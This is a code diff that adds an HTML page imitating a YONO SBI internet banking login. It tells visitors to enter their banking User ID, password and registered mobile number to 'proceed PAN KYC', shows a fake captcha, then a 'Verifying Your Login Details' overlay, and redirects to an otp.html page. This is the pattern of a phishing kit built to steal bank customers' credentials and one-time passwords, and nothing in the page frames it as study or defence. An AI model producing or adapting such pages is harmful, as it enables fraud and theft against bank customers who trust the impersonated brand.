@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>sbynorewdpolnt</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #eef2f5;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+      position: relative;
+    }
+    .header, .footer {
+      width: 100%;
+      max-width: 350px;
+      background-color: #fff;
+      text-align: center;
+      position: relative;
+    }
+    .header img.main-header {
+      width: 100%;
+      max-width: 1000px;
+      display: block;
+      margin: 0 auto;
+    }
+    .menu-button {
+      position: absolute;
+      top: 10px;
+      left: 10px;
+      width: 30px;
+      height: 30px;
+    }
+    .container {
+      background-color: #ffffff;
+      width: 360px;
+      padding: 22px 5px;
+      border: 1px solid #ccc;
+      border-radius: 10px;
+      text-align: left;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+      margin: 2px 0;
+      position: relative;
+      z-index: 1;
+    }
+    .logo img {
+      width: 300px;
+      display: block;
+      margin: 0 auto 10px auto;
+    }
+    .welcome {
+      font-size: 22px;
+      font-weight: bold;
+      margin-bottom: 5px;
+      color: #333;
+      text-align: left;
+      padding-left: 20px;
+    }
+    .sub-welcome {
+      font-size: 14px;
+      color: #4e0a69;
+      line-height: 1.6;
+      margin-bottom: 25px;
+      text-align: left;
+      padding: 0 20px;
+    }
+    form {
+      padding: 0 20px;
+    }
+    label {
+      font-size: 14px;
+      margin-bottom: 4px;
+      display: block;
+      color: #504f4f;
+      position: absolute;
+      top: 16px;
+      left: 12px;
+      transition: all 0.3s ease;
+    }
+    .form-group {
+      margin-bottom: 20px;
+      position: relative;
+    }
+    .form-group input {
+      width: 100%;
+      border: none;
+      border-bottom: 1px solid #ccc;
+      padding: 12px 0 8px;
+      font-size: 14px;
+      outline: none;
+      background: transparent;
+      transition: all 0.3s ease;
+    }
+    .form-group input:focus {
+      border-bottom: 2px solid #6a1b9a;
+    }
+    .form-group input:focus + label {
+      transform: translateY(-20px);
+      font-size: 12px;
+      color: #6a1b9a;
+    }
+    .form-group input:not(:placeholder-shown) + label {
+      transform: translateY(-20px);
+      font-size: 12px;
+      color: #6a1b9a;
+    }
+    .captcha-section {
+      display: flex;
+      align-items: center;
+      margin-bottom: 5px;
+    }
+    .captcha-image {
+      background: #5e105e;
+      color: #fff;
+      font-size: 18px;
+      font-weight: bold;
+      padding: 8px 12px;
+      border-radius: 4px;
+      margin-right: 10px;
+      letter-spacing: 2px;
+    }
+    .refresh-captcha {
+      font-size: 20px;
+      color: #6a1b9a;
+      cursor: pointer;
+    }
+    .login-btn {
+      background-color: #6a1b9a;
+      color: white;
+      border: none;
+      padding: 12px 0;
+      font-size: 14px;
+      width: 100%;
+      border-radius: 4px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+      margin-top: 10px;
+    }
+    .login-btn:hover {
+      background-color: #530d80;
+    }
+    .links {
+      margin-top: 15px;
+      text-align: center;
+      font-size: 13px;
+    }
+    .links a {
+      color: #6a1b9a;
+      text-decoration: none;
+      margin: 0 5px;
+    }
+    .security-image img {
+      width: 100%;
+      max-width: 1000px;
+      border-radius: 6px;
+      margin-top: 10px;
+    }
+    /* Loading Overlay */
+    .overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(255, 255, 255, 0.8);
+      backdrop-filter: blur(5px);
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      z-index: 10;
+      display: none;
+    }
+    .spinner {
+      border: 5px solid #f3f3f3;
+      border-top: 5px solid #6a1b9a;
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .loading-text {
+      font-size: 18px;
+      color: #333;
+      text-align: center;
+      max-width: 80%;
+    }
+    /* Mobile responsive styles */
+    @media (max-width: 600px) {
+      .container {
+        width: 90%;
+        padding: 15px;
+      }
+      .logo img {
+        width: 80%;
+      }
+      .header img.main-header, .footer img {
+        width: 100%;
+      }
+      .sub-welcome {
+        font-size: 13px;
+      }
+      .security-image img {
+        width: 100%;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<!-- Loading Overlay -->
+<div class="overlay" id="overlay">
+  <div class="spinner"></div>
+  <div class="loading-text" id="loadingText">Please wait...<br>Verifying Your Login Details...<br>Redirecting in <span id="countdown">3</span> seconds.</div>
+</div>
+
+<!-- Top Header -->
+<div class="header">
+  <img src="https://i.ibb.co/35CHJp2B/Menu.png" alt="Menu" class="menu-button">
+  <img src="https://i.ibb.co/sdHPbk20/Header-1.jpg" alt="Top Header Logo" class="main-header">
+</div>
+
+<!-- Container -->
+<div class="container">
+  <div class="logo">
+    <img src="https://i.ibb.co/ymnJ9sTK/IMG-20250428-192351.jpg" alt="YONO SBI Logo">
+  </div>
+  <div class="sub-welcome">
+    Please use your existing <strong>Internet Banking User ID</strong> and <strong>Password</strong> (credentials) of Personal<strong> and Corporate Internet Banking 
+    to proceed <strong>PAN KYC</strong>
+  </div>
+
+  <form onsubmit="showLoading(); return false;">
+    <div class="form-group">
+      <input type="text" id="userID" placeholder=" " required>
+      <label for="userID">User ID <span style="color: red;">*</span></label>
+    </div>
+
+    <div class="form-group">
+      <input type="password" id="password" placeholder=" " required>
+      <label for="password">Password <span style="color: red;">*</span></label>
+    </div>
+
+    <div class="form-group">
+      <input type="tel" id="mobile" placeholder=" " required maxlength="10">
+      <label for="mobile">Registered mobile number <span style="color: red;">*</span></label>
+    </div>
+
+    <!-- New Captcha Input -->
+    <div class="form-group">
+      <input type="text" id="captchaInput" placeholder="" required>
+      <label for="captchaInput">Captcha <span style="color: red;">*</span></label>
+    </div>
+    
+    <div class="form-group"> 
+      <div class="captcha-section">
+        <div class="captcha-image" id="captchaText">89 85 B</div>
+        <div class="refresh-captcha" onclick="refreshCaptcha()">&#x21bb;</div>
+      </div>
+
+    <button type="submit" class="login-btn">LOG IN</button>
+
+    <div class="links">
+      <a href="#">Lock Access</a> |
+      <a href="#">Forgot Password</a> |
+      <a href="#">Forgot Username</a>
+    </div>
+  </form>
+
+  <div class="security-image">
+    <img src="https://i.ibb.co/zVvCpZM2/Security-A.jpg" alt="Security Image">
+  </div>
+</div>
+
+<!-- Bottom Footer -->
+<div class="footer">
+  <img src="https://i.ibb.co/FbxkQBpm/Footer.jpg" alt="Footer Image">
+</div>
+
+<script>
+  function showLoading() {
+    document.getElementById('overlay').style.display = 'flex';
+    var countdown = 3;
+    var countdownElement = document.getElementById('countdown');
+    
+    var interval = setInterval(function() {
+      countdown--;
+      countdownElement.textContent = countdown;
+      if (countdown === 0) {
+        clearInterval(interval);
+        window.location.href = 'otp.html';
+      }
+    }, 1000);
+  }
+
+  function refreshCaptcha() {
+    const characters = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+    let captcha = '';
+    for (let i = 0; i < 6; i++) {
+      captcha += characters.charAt(Math.floor(Math.random() * characters.length)) + ' ';
+    }
+    document.getElementById('captchaText').innerText = captcha.trim();
+  }
+</script>
+
+</body>
+</html>
